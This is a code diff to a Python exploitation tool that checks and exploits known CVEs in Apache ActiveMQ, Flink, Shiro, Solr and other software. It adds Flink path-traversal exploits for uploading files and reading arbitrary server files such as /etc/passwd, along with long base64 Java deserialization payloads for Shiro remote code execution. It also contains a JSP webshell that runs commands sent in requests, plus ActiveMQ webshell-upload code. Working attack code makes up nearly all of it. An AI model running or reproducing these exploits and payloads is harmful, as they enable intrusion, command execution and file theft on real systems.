@@ -5,6 +5,8 @@
 import os
 import sys
 import argparse
+from gevent import monkey;monkey.patch_all()
+from gevent import spawn,joinall
 import textwrap
 import re
 import time
@@ -13,12 +15,15 @@ import string
 import json
 import requests
 import socket
+import socks
 import base64
 import uuid
 import http.client
 import urllib
 import urllib.request
 import platform
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED
+import threading
 from lxml import etree
 from urllib import request, parse
 from urllib.parse import urlencode
@@ -31,23 +36,11 @@ from bs4 import BeautifulSoup
 from colorama import init, Fore, Back, Style
 from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
 from Crypto.Cipher import AES
+
 init(autoreset=True)
 # http.client.HTTPConnection._http_vsn = 10
 http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
 urllib3.disable_warnings()
-headers = {
-    'Accept': 'application/x-shockwave-flash,'
-              'image/gif,'
-              'image/x-xbitmap,'
-              'image/jpeg,'
-              'image/pjpeg,'
-              'application/vnd.ms-excel,'
-              'application/vnd.ms-powerpoint,'
-              'application/msword,'
-              '*/*',
-    'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
-    'Content-Type':'application/x-www-form-urlencoded'
-}
 
 class Timed(object):
     def timed(self, de):
@@ -66,7 +59,6 @@ class Timed(object):
         no_color_timed = "["+str(now)[11:19]+"] "
         return no_color_timed
 now = Timed()
-
 
 class Colored(object):
     def magenta(self, s):
@@ -115,13 +107,14 @@ class Colored(object):
         return now.timed(de=0) + color.yeinfo() + color.yellow(" input \"upload\" upload webshell")
 color = Colored()
 
-#time.sleep(3)
 vulnlist = color.ccyan("""
  +-------------------+------------------+-----+-----+-------------------------------------------------------------+
  | Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
  +-------------------+------------------+-----+-----+-------------------------------------------------------------+
  | Apache ActiveMQ   | CVE-2015-5254    |  Y  |  N  | < 5.13.0, deserialization remote code execution             |
  | Apache ActiveMQ   | CVE-2016-3088    |  Y  |  Y  | < 5.14.0, http put&move upload webshell                     |
+ | Apache Flink      | CVE-2020-17518   |  Y  |  N  | < 1.11.3 or < 1.12.0, upload path traversal                 |
+ | Apache Flink      | CVE-2020-17519   |  Y  |  Y  | 1.5.1 - 1.11.2, 'jobmanager/logs' path traversal            |
  | Apache Shiro      | CVE-2016-4437    |  Y  |  Y  | <= 1.2.4, shiro-550, rememberme deserialization rce         |
  | Apache Solr       | CVE-2017-12629   |  Y  |  Y  | < 7.1.0, runexecutablelistener rce & xxe, only rce is here  |
  | Apache Solr       | CVE-2019-0193    |  Y  |  N  | < 8.2.0, dataimporthandler module remote code execution     |
@@ -217,8 +210,7 @@ explists = ("CVE-2017-12629"
             "CVE-2018-20062"
             "CVE-2019-9082"
             "CVE-2020-13942"
-           )
-
+            "CVE-2020-17519")
 
 class Verification(object):
     def show(self, request, pocname, method, rawdata, info):
@@ -234,14 +226,14 @@ class Verification(object):
         if CMD == "netstat -an" or CMD == "id" or CMD == "echo VuLnEcHoPoCSuCCeSS":
             print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
         else:
-            print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname))
-        #if DEBUG=="debug":
-        #    print (rawdata)
+            print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname+"          "))
         if OUTPUT is not None:
             self.text_output(self.no_color_show_succes(pocname, info))
-            
     def no_rce_show(self, request, pocname, method, rawdata, info):
         if VULN is not None:
+            if DEBUG == "debug":
+                print(rawdata)
+                pass
             if r"PoCWating" in request:
                 print (now.timed(de=DELAY)+color.yeinfo()+color.yellow(" Command Executed Successfully (No Echo)"))
             else:
@@ -251,9 +243,8 @@ class Verification(object):
             print(now.timed(de=DELAY) + color.yellow("[?] The target suspect " + pocname + " [" + method + "] " + info))
         elif r"PoCSuCCeSS" in request:
             print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
-        #print (info)
-        if DEBUG=="debug":
-            print (rawdata)
+        elif r":-)" in request:
+            print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
         if OUTPUT is not None:
             self.text_output(self.no_color_show_succes(pocname, info))
     def no_color_show_succes(self, pocname, info):
@@ -263,21 +254,13 @@ class Verification(object):
     def generic_output(self, request, pocname, method, rawdata, info):
         # Echo Error
         if r"echo VuLnEcHoPoCSuCCeSS" in request or r"echo%20VuLnEcHoPoCSuCCeSS" in request or r"echo%2520VuLnEcHoPoCSuCCeSS" in request or r"%65%63%68%6f%20%56%75%4c%6e%45%63%48%6f%50%6f%43%53%75%43%43%65%53%53" in request:
-            print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "),
-                  color.magenta(pocname)),end="                    \r",flush = True)
+            if DEBUG == "debug":
+                print(now.timed(de=DELAY) + color.magenta("[-] The target no " + color.magenta(pocname)))
+            else:
+                print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "),
+                                           color.magenta(pocname)),end="                    \r",flush = True)
         elif r"VuLnEcHoPoCSuCCeSS" in request:
             self.show(request, pocname, method, rawdata, info)
-        # Linux host ====================================================================
-        #elif r"uid=" in request:
-        #    info = info+color.green(" [os:linux]")
-        #    self.show(request, pocname, method, rawdata, info)
-        #elif r"Active Internet connections" in request or r"command not found" in request:
-        #    info = info+color.green(" [os:linux]")
-        #    self.show(request, pocname, method, rawdata, info)
-        # Windows host ==================================================================
-        #elif r"Active Connections" in request  or r"活动连接" in request:
-        #    info = info+color.green(" [os:windows]")
-        #    self.show(request, pocname, method, rawdata, info)
         # Public :-)
         elif r":-)" in request:
             self.no_rce_show(request, pocname, method, rawdata, info)
@@ -294,15 +277,18 @@ class Verification(object):
             self.no_rce_show(request, pocname, method, rawdata, info)
         # Public: "PoCWating" in request ,Failed
         elif r"PoCWating" in request:
-            print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "),
-                  color.magenta(pocname)),end="                    \r",flush = True)
+            if DEBUG == "debug":
+                print(now.timed(de=DELAY) + color.magenta("[-] The target no " + color.magenta(pocname)))
+            else:
+                print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "),
+                                           color.magenta(pocname)), end="                    \r", flush=True)
         # Public: "netstat -an" command check
         elif r"NC-Succes" in request:
             print (now.timed(de=DELAY)+color.yeinfo()+color.green(" The reverse shell succeeded. Please check"))
         elif r"NC-Failed" in request:
             print (now.timed(de=DELAY)+color.rewarn()+color.magenta(" The reverse shell failed. Please check"))
         else:
-            #print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
+            # 漏洞利用模式显示
             if VULN is not None:
                 if DEBUG == "debug":
                     print(rawdata)
@@ -313,28 +299,28 @@ class Verification(object):
                     print (request)
                 return None
             if CMD == "netstat -an" or CMD == "id" or CMD == "echo VuLnEcHoPoCSuCCeSS":
-                print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "), 
-                      color.magenta(pocname)),end="                    \r",flush = True)
+                if DEBUG == "debug":
+                    print(now.timed(de=DELAY) + color.magenta("[-] The target no " + color.magenta(pocname)))
+                else:
+                    print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "),
+                                               color.magenta(pocname)), end="                    \r", flush=True)
             else:
-                print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname))
-            if DEBUG=="debug":
-                print (rawdata)
-
+                print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname+"          "))
+            #if DEBUG=="debug":
+            #    print (rawdata)
     def timeout_output(self, pocname):
         print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because timeout !!!"))
-
     def connection_output(self, pocname):
         print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because unable to connect !!!"))
-
     def text_output(self, item):
         with open(OUTPUT, 'a') as output_file:
             output_file.write("%s\n" % item)
 verify = Verification()
 
-
 class ApacheActiveMQ():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.jsp_webshell = '<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
             '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
             ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
@@ -344,6 +330,7 @@ class ApacheActiveMQ():
             'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
 
     def cve_2015_5254(self):
+        self.threadLock.acquire()
         self.pocname = "Apache AcitveMQ: CVE-2015-5254"
         self.rawdata = None
         self.info = color.rce()
@@ -355,7 +342,7 @@ class ApacheActiveMQ():
                 self.base64_p = base64.b64encode(str.encode(self.pa))
                 self.p = self.base64_p.decode('utf-8')
                 self.headers_base64 = {
-                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'User-Agent': USER_AGENT,
                     'Authorization': 'Basic '+self.p
                 }
                 self.request = requests.get(self.url + "/admin", headers=self.headers_base64, timeout=TIMEOUT, verify=False)
@@ -374,8 +361,10 @@ class ApacheActiveMQ():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2016_3088(self):
+        self.threadLock.acquire()
         self.pocname = "Apache AcitveMQ: CVE-2016-3088"
         self.rawdata = None
         self.path = "null"
@@ -391,7 +380,7 @@ class ApacheActiveMQ():
                 self.base64_p = base64.b64encode(str.encode(self.pa))
                 self.p = self.base64_p.decode('utf-8')
                 self.headers_base64 = {
-                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'User-Agent': USER_AGENT,
                     'Authorization': 'Basic '+self.p
                 }
                 self.request = requests.get(self.url + "/admin/test/systemProperties.jsp", headers=self.headers_base64,
@@ -404,7 +393,7 @@ class ApacheActiveMQ():
                 self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.poc,
                                             timeout=TIMEOUT, verify=False)
                 self.headers_move = {
-                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'User-Agent': USER_AGENT,
                     'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
                 }
                 self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
@@ -414,11 +403,12 @@ class ApacheActiveMQ():
                                             timeout=TIMEOUT, verify=False)
                 self.info = "[upload: "+self.url+"/api"+self.webshell+" ]"+" ["+self.pa+"]"
                 verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                #self.threadLock.release()
             else:
                 self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.exp,
                                             timeout=TIMEOUT, verify=False)
                 self.headers_move = {
-                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'User-Agent': USER_AGENT,
                     'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
                 }
                 self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
@@ -435,11 +425,82 @@ class ApacheActiveMQ():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
+class ApacheFlink():
+    def __init__(self, url):
+        self.url = url
+        self.threadLock = threading.Lock()
+
+    def cve_2020_17518(self):
+        # 2020-01-07
+        self.threadLock.acquire()
+        self.pocname = "Apache Flink: CVE-2020-17518"
+        self.rawdata = None
+        self.info = "null"
+        self.name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+        self.method = "post"
+        self.r = "PoCWating"
+        self.headers = {
+            'User-Agent': USER_AGENT,
+            'Connection': 'close',
+            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y'
+        }
+        self.data = '\n------WebKitFormBoundaryoZ8meKnrrso89R6Y'
+        self.data += '\nContent-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/' + self.name
+        self.data += '\n\nsuccess'
+        self.data += '\n------WebKitFormBoundaryoZ8meKnrrso89R6Y--'
+        try:
+            self.r404 = requests.get(self.url+"/jars/upload", headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.request = requests.post(self.url+"/jars/upload", data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+            if self.r404.status_code == 404 and self.request.status_code == 400:
+                if r"org.apache.flink.runtime.rest.handler.RestHandlerException:" in self.request.text:
+                    self.info = "[upload: /tmp/" + self.name + "]"
+                    self.r = "PoCSuCCeSS"
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
+
+    def cve_2020_17519(self):
+        # 2020-01-07
+        self.threadLock.acquire()
+        self.pocname = "Apache Flink: CVE-2020-17519"
+        self.rawdata = None
+        self.info = "null"
+        self.method = "get"
+        self.r = "PoCWating"
+        self.poc = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+        self.cmd = CMD.replace("/", "%252f")
+        self.exp = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f.." + self.cmd
+        try:
+            if VULN == None:
+                self.request = requests.get(self.url+self.poc, headers=HEADERS, timeout=TIMEOUT, verify=False)
+                if r"root" in self.request.text:
+                    self.info = "[traversal: /etc/passwd]"
+                    self.r = "PoCSuCCeSS"
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            else:
+                self.request = requests.get(self.url + self.exp, headers=HEADERS, timeout=TIMEOUT, verify=False)
+                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
 class ApacheShiro():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.payload_cve_2016_4437 = ("2ubm8q7W6tzw1j7hq7ovER9VQVODWyzPy9xYUejfBxoGJV7x9MUsUWs5Jag5CUxzzaihGxlyZ0yTPD"
             "oqQqBQTyXdBsP15i8k1RKka/sDhGve7cEyYIKxwhaJDkzN6S5G4A1N738ll5qUrnmGZsx1KE2798eONq55XslWNgy2FYhGO9DbBc/K/b"
             "k2W+DPwfOb/v31BBAAExeu3ePjj3aYcjoBOdRoKoxAhO+EeR0KjYPugeb2hODj38SNG5q1Pa2Nnsx73TQlhE8wBZiwmMl+DvBqCehpZF"
@@ -504,6 +565,70 @@ class ApacheShiro():
             "9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD///"
             "//dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vT0RLWmZ0SndiBwABAQ"
             "AQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29PREtaZnRKd2IuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW"
+            "5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQ"
+            "AHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKU"
+            "xqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWV"
+            "BFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYX"
+            "ZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQ"
+            "AYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdD"
+            "spTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1"
+            "dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBABNqYXZhLm5pby"
+            "5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTW"
+            "FwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2"
+            "V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYX"
+            "ZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1N0cmluZz"
+            "spVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAF"
+            "EAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2"
+            "JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA"
+            "1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbm"
+            "cvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE"
+            "5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2"
+            "VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgA"
+            "EAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAI"
+            "sLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcg"
+            "gAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZX"
+            "N0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZz"
+            "spTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIAL"
+            "ABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZG"
+            "VyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwAvwDACg"
+            "C7AMEBABFqYXZhL2xhbmcvUHJvY2VzcwcAwwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMAMUAxgoAxA"
+            "DHAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAjAMkKALkAygEAAlxBCADMAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3"
+            "RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADOAM8KALkA0AEABG5leHQMANIAcQoAuQDTAQAIZ2V0Qnl0ZXMBAAQoKVtCDADVANYKAF"
+            "wA1wwABwAICgACANkBAA1nZXRQcm9wZXJ0aWVzAQAYKClMamF2YS91dGlsL1Byb3BlcnRpZXM7DADbANwKAKYA3QEAE2phdmEvdXRpbC"
+            "9IYXNodGFibGUHAN8BAAh0b1N0cmluZwwA4QBxCgDgAOIBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDkAQBAY29tL3N1bi9vcmcvYXBhY2"
+            "hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA5goA5wBeACEAAgDnAAAAAAADAAoABwAIAAIAPA"
+            "AAANwACAAFAAAAsRIKuAAQTi22ABRNLRIWBr0ADFkDEhhTWQSyAB5TWQWyAB5TtgAiLAa9AARZAytTWQS7ABpZA7cAJlNZBbsAGlkrvr"
+            "cAJlO2ACxXKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwBIOgQSObgAEE4tEjsEvQAMWQMSGFO2ACItBL0ABFkDK1O2ACxNKr"
+            "YAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwADsQABAAAAaABrADcAAQBAAAAAEQAC9wBrBwA3/QBEBwAEBwAMAD0AAAAEAAEAPw"
+            "AKAEEAQgACADwAAAB+AAMABQAAAD8BTSq2ADBOpwAZLSu2AEZNpwAWpwAAOgQttgBLTqcAAy0SBKb/5ywBpgAMuwBIWSu3AE6/LAS2AF"
+            "QsKrYAWrAAAQAKABMAFgBIAAEAQAAAACUABv0ACgcAVgcADAj/AAIABAcABAcAXAcAVgcADAABBwBICQUNAD0AAAAEAAEAPwABACMAXQ"
+            "ACADwAAAM2AAgADQAAAj8qtwDoAzYEuABltgBpEmu4AG3AAG86BQM2BhUGGQW+ogIfGQUVBjI6BxkHAaYABqcCCRkHtgBzTi0SdbYAeZ"
+            "oADC0Se7YAeZoABqcB7hkHEn24AG1MK8EAf5oABqcB3CsSgbgAbRKDuABtEoW4AG1MpwALOginAcOnAAArEoe4AG3AAIk6CQM2ChUKGQ"
+            "m5AI0BAKIBnhkJFQq5AJACADoLGQsSkrgAbUwrtgAwEpQDvQAMtgA1KwO9AAS2ACxNK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKYU7"
+            "YALMAAXE4tAaUACi22AJyZAAanAFgstgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy2ADASoAW9AAxZAxJcU1"
+            "kEElxTtgA1LAW9AARZAxKYU1kELVO2ACxXBDYEK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKiU7YALMAAXE4tAaUACi22AJyZAAanAI"
+            "0stgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKkuACqtgCtEq+2AHmZABgGvQBcWQMSsVNZBBKzU1kFLVOnAB"
+            "UGvQBcWQMStVNZBBK3U1kFLVM6DCy7ALlZuwC7WRkMtwC+tgDCtgDItwDLEs22ANG2ANS2ANi4ANoENgQtAaUACi22AJyZAAgVBJoABq"
+            "cAECy4AN62AOO2ANi4ANoVBJkABqcACYQKAaf+XBUEmQAGpwAJhAYBp/3fsQABAF8AcABzAD8AAQBAAAAA3QAZ/wAaAAcHAAIAAAABBw"
+            "BvAQAA/AAXBwBh/wAXAAgHAAIAAAcAXAEHAG8BBwBhAAAC/wARAAgHAAIHAAQABwBcAQcAbwEHAGEAAFMHAD8E/wACAAgHAAIHAAQABw"
+            "BcAQcAbwEHAGEAAP4ADQAHAIkB/wBjAAwHAAIHAAQHAAQHAFwBBwBvAQcAYQAHAIkBBwAEAAAC+wBULgL7AE1RBwDlKQsEAgwH/wAFAA"
+            "sHAAIHAAQABwBcAQcAbwEHAGEABwCJAQAA/wAHAAgHAAIAAAABBwBvAQcAYQAA+gAFAD0AAAAEAAEAPwABAAUAAAACAAZ1cQB+ABAAAA"
+            "HUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPG"
+            "luaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lck"
+            "NsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACg"
+            "ALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYW"
+            "xpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAA"
+            "EADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEA"
+            "AJcHQABFB3bnJwdwEAeHEAfgANeA==")
+        self.CommonsBeanutils2 = ("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3"
+            "J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3"
+            "LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS"
+            "5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3"
+            "BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8"
+            "FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS"
+            "9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD///"
+            "//dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vTkdVYU4zQnJRBwABAQ"
+            "AQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29OR1VhTjNCclEuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW"
             "5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQ"
             "AHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKU"
             "xqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWV"
@@ -687,11 +812,136 @@ class ApacheShiro():
